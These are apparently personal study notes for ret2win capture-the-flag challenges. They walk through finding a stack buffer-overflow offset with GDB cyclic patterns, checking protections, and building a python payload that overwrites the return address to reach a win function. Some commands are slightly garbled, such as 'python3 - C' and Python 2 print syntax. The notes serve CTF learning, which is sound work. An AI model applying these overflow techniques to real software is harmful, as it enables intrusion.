### N o T e S

---

In ret2win, we need to execute the win function to get the flag by overwriting the EIP.

```py
| Finding the offset using GDB for the return address |
- file <filename>
- info functions
- cyclic 100
- run and check the RIP register which is the instruction pointer
- cyclic -l <the four characters found>
- Find the return address, objdump, ghidra

python3 -c 'print("A"*offset+"return address")' > payload
./ret2win < payload
```

```py
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Control the EIP or RIP

Alternatively, inside gdb use pattern create 200
```



Find the offset we use the value in `RSP` register.

- First two steps, add permissions using chmod  +x file name.  
- Then, check the options and protections enabled using checksec --file.  
- Aim of the pwn challenge is generally to overflow the buffer and overwrite the return address.
- It redirects the program towards a function which outputs the flag.

#### Things to do in classic ret2win :

Use Ghidra and GDB. 

```py
Steps : 
disassemble flag
(assume offset is 40)

We use the memory address of the first function in disassemble flag
(assume it is 0x0000000000401196)

python3 - C 'print "A" * 40 + "\x96\x11\x40\x00\x00\x00\x00\x00" ' 

(add this to a file payload)
python3 - C 'print "A" * 40 + "\x96\x11\x40\x00\x00\x00\x00\x00" ' > payload

echo "Fake_flag" > flag.txt
(Dummy flag for local file)

Now, run < payload 
(fake_flag will be printed)

./zoom2win < payload
fake_flag Segmentation fault

Now when we run the netcat command with the payload we get our flag.
```

---

Thank you

